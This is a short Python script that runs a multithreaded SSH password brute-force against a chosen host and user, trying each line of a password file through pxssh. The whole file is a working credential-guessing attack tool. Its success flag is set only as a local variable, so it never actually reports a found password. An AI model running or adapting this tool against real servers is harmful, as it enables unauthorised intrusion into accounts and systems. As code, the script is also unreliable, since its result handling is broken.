# encoding: utf-8
import optparse
from threading import Thread, Lock, Semaphore
import os
from pexpect import pxssh

global Found
Found = False
global target_pwd
target_pwd = ""
print_lock = Lock()
print_sem = Semaphore(5)


def connection(host, user, passwd):
    try:
        print_sem.acquire()
        s = pxssh.pxssh()
        s.login(host, user, passwd)
        Found = True
        target_pwd = passwd
    except Exception as e:
        pass
        # print(e)
        # print("{0} can't not login!".format(passwd))
    finally:
        print_sem.release()


if __name__ == "__main__":
    parser = optparse.OptionParser("usage %prog -H <target_host> -u <target_user> -p <passwd_file>")
    parser.add_option('-H', dest="target_host")
    parser.add_option('-u', dest="target_user")
    parser.add_option("-p", dest='target_pwd_file')
    (options, args) = parser.parse_args()
    target_host = options.target_host
    target_user = options.target_user
    target_pwd_file = options.target_pwd_file
    if target_host is None or target_user is None or target_pwd_file is None:
        print(parser.usage)
        exit(0)
    if os.path.isfile(target_pwd_file):
        with open(target_pwd_file) as f:
            one_line = f.readline().strip()
            while one_line:
                if Found:
                    print("found password:{2} for user:{0} on host:{1}".format(target_user, target_host, target_pwd))
                    exit(0)
                # connection(target_host, target_user, one_line)
                print('try passwd:{0}'.format(one_line))
                thd = Thread(target=connection, args=(target_host, target_user, one_line))
                thd.start()
                one_line = f.readline().strip()
    # if print_sem.acquire():
    #     if Found:
    #         print("found password:{2} for user:{0} on host:{1}".format(target_user, target_host, target_pwd))
    # # connection(target_host, target_user, target_pwd_file)

